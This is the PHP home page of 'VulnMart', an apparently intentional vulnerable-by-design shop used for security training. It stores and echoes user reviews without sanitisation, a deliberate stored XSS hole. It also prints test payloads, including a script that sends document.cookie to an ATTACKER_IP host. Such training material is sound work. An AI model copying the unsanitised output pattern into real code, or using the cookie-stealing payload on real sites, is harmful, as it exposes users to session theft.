<?php
require_once 'config.inc';

// Procesar comentarios (XSS vulnerable)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['comment'])) {
    $comment = $_POST['comment'];
    // ¡VULNERABILIDAD: XSS - Sin sanitización!
    $comments_file = 'uploads/comments.txt';
    file_put_contents($comments_file, date('Y-m-d H:i:s') . ": " . $comment . "\n", FILE_APPEND);
}

// Leer comentarios existentes
$comments = [];
if (file_exists('uploads/comments.txt')) {
    $comments = file('uploads/comments.txt', FILE_IGNORE_NEW_LINES);
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VulnMart - Home</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #f5f5f5; color: #333; }
        .container { max-width: 1200px; margin: 0 auto; padding: 20px; }
        
        header { 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
            color: white; 
            padding: 1rem 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        .header-content {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        h1 { font-size: 2rem; }
        
        .vuln-badge {
            background: #dc3545;
            color: white;
            padding: 0.2rem 0.5rem;
            border-radius: 3px;
            font-size: 0.8rem;
            margin-left: 1rem;
        }
        
        nav { display: flex; gap: 1.5rem; }
        nav a { 
            color: white; 
            text-decoration: none; 
            padding: 0.5rem 1rem; 
            border-radius: 4px; 
            transition: background 0.3s;
        }
        nav a:hover { background: rgba(255,255,255,0.2); }
        
        .alert {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            padding: 1rem;
            margin: 1.5rem 0;
            border-radius: 4px;
            border-left: 4px solid #ffc107;
        }
        
        .products {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 20px;
            margin: 2rem 0;
        }
        
        .product-card {
            background: white;
            border-radius: 8px;
            overflow: hidden;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            transition: transform 0.3s;
        }
        
        .product-card:hover {
            transform: translateY(-5px);
        }
        
        .product-image {
            height: 150px;
            background: #667eea;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-size: 2rem;
        }
        
        .product-info {
            padding: 1rem;
        }
        
        .product-price {
            color: #667eea;
            font-weight: bold;
            font-size: 1.2rem;
            margin: 0.5rem 0;
        }
        
        .btn {
            display: inline-block;
            background: #667eea;
            color: white;
            padding: 0.5rem 1rem;
            border-radius: 4px;
            text-decoration: none;
            margin-top: 0.5rem;
        }
        
        .comments-section {
            background: white;
            padding: 1.5rem;
            border-radius: 8px;
            margin-top: 2rem;
        }
        
        .comment-form textarea {
            width: 100%;
            padding: 0.5rem;
            margin: 0.5rem 0;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        
        .comment {
            padding: 0.5rem;
            border-bottom: 1px solid #eee;
            margin: 0.5rem 0;
        }
        
        footer {
            text-align: center;
            padding: 2rem;
            background: #333;
            color: white;
            margin-top: 3rem;
        }
    </style>
</head>
<body>
    <header>
        <div class="container">
            <div class="header-content">
                <div>
                    <h1>🛍️ VulnMart <span class="vuln-badge">VULNERABLE DEMO</span></h1>
                    <p>Educational purposes only</p>
                </div>
                <nav>
                    <a href="index.php">Home</a>
                    <a href="product.php">Products</a>
                    <a href="login.php">Login</a>
                    <?php if (isset($_SESSION['is_admin']) && $_SESSION['is_admin']): ?>
                        <a href="admin/dashboard.php">Admin Panel</a>
                    <?php endif; ?>
                </nav>
            </div>
        </div>
    </header>
    
    <div class="container">
        <div class="alert">
            ⚠️ <strong>Warning:</strong> This application contains intentional security vulnerabilities for educational purposes only. Do not deploy in production!
        </div>
        
        <h2>Welcome to VulnMart!</h2>
        <p>Your one-stop shop for all things tech. This is an intentionally vulnerable web application for security training.</p>
        
        <div class="products">
            <div class="product-card">
                <div class="product-image">💻</div>
                <div class="product-info">
                    <h3>Laptop Gaming</h3>
                    <p>Powerful gaming laptop with RTX 4090</p>
                    <div class="product-price">$1,200.00</div>
                    <a href="product.php?id=1" class="btn">View Details</a>
                </div>
            </div>
            
            <div class="product-card">
                <div class="product-image">📱</div>
                <div class="product-info">
                    <h3>Smartphone Pro</h3>
                    <p>Latest smartphone with 5G</p>
                    <div class="product-price">$800.00</div>
                    <a href="product.php?id=2" class="btn">View Details</a>
                </div>
            </div>
            
            <div class="product-card">
                <div class="product-image">🎧</div>
                <div class="product-info">
                    <h3>Wireless Headphones</h3>
                    <p>Noise cancelling wireless headphones</p>
                    <div class="product-price">$150.00</div>
                    <a href="product.php?id=3" class="btn">View Details</a>
                </div>
            </div>
        </div>
        
        <!-- ¡VULNERABILIDAD: XSS en comentarios! -->
        <div class="comments-section">
            <h3>Customer Reviews (XSS Vulnerable)</h3>
            
            <form method="POST" class="comment-form">
                <textarea name="comment" placeholder="Leave a review..." rows="3" required></textarea>
                <button type="submit" class="btn">Submit Review</button>
            </form>
            
            <div class="comments-list">
                <h4>Recent Reviews:</h4>
                <?php foreach(array_reverse($comments) as $comment): ?>
                    <div class="comment">
                        <!-- ¡VULNERABILIDAD: XSS - Sin sanitización! -->
                        <?= $comment ?>
                    </div>
                <?php endforeach; ?>
            </div>
            
            <div style="background: #ffcccc; padding: 10px; margin-top: 15px; border-radius: 4px;">
                <h4>XSS Test Payloads:</h4>
                <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code><br>
                <code>&lt;script&gt;fetch('http://ATTACKER_IP:8000/steal?cookie='+document.cookie)&lt;/script&gt;</code>
            </div>
        </div>
    </div>
    
    <footer>
        <p>VulnMart &copy; 2024 - Security Training Environment</p>
        <p style="font-size: 0.9rem; opacity: 0.8; margin-top: 0.5rem;">
            Vulnerabilities: SQLi, XSS, LFI, CSRF, File Upload, SSRF, Deserialization
        </p>
    </footer>
</body>
</html>
